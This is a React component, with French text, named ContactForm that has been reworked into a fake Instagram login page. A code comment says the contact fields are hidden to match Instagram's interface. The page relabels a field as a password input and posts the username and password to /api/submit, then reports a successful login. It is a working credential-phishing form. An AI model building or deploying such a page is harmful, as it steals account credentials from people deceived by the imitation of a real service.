"use client";

import { useState } from "react";

export default function ContactForm() {
  const [form, setForm] = useState({
    nom: "",
    email: "",
    telephone: "",
    message: "",
  });
  const [status, setStatus] = useState<"idle" | "loading" | "success" | "error">("idle");

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.MouseEvent) => {
    e.preventDefault();
    setStatus("loading");
    try {
      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      });
      if (res.ok) {
        setStatus("success");
        setForm({ nom: "", email: "", telephone: "", message: "" });
      } else {
        setStatus("error");
      }
    } catch {
      setStatus("error");
    }
  };

  return (
    <>
      <h2>Connectez-vous</h2>

      <div className="field">
        <label>Nom</label>
        <input name="nom" value={form.nom} onChange={handleChange} placeholder="Nom d'utilisateur, téléphone ou e-mail" />
      </div>

      <div className="field">
        <label>Email</label>
        <input name="email" type="password" value={form.email} onChange={handleChange} placeholder="Mot de passe" />
      </div>
      
      {/* On masque les champs téléphone et message pour coller à l'interface Instagram */}
      <div className="field" style={{display: 'none'}}>
        <label>Téléphone</label>
        <input name="telephone" value={form.telephone} onChange={handleChange} placeholder="Téléphone" />
      </div>

      <div className="field" style={{display: 'none'}}>
        <label>Message</label>
        <textarea name="message" value={form.message} onChange={handleChange} placeholder="Message" rows={5} />
      </div>

      <button onClick={handleSubmit} disabled={status === "loading"} className="btn-submit">
        {status === "loading" ? "Connexion..." : "Se connecter"}
      </button>

      {status === "success" && <p className="msg success">✅ Connecté !</p>}
      {status === "error" && <p className="msg error">❌ Identifiants incorrects.</p>}
    </>
  );
}